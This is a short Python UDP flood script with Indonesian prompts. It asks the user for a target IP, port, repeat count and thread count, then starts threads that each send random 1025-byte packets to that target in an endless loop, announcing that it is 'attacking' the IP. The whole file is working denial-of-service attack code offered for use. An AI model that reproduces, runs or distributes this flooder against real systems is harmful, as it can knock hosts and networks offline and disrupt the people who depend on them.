import os, sys, random, threading, time, socket
#Cuman 30 Line Dek
def print_SlowType(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)

os.system("clear")
print("\033[93m")
nama = str(input("Namamu :"))
ip = str(input("ip :"))
port = int(input("Port :"))
times = int(input("Times :"))
threads = int(input("Threads :"))
choice = input("y/n :")
os.system('clear')

print_SlowType("\033[91m%s Menyerang Ip %s Dan Port %s"%(nama, ip, port))

def X():
	hide = random._urandom(1025)
	while True:
		try:
			D = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #Int Udp
			D.connect((ip,port))
			D.send(hide)
			for x in range(times):
				D.send(hide)
		except:
			D.close()

for y in range(threads):
	if choice == 'y':
		ls = threading.Thread(target = X)
		ls.start()
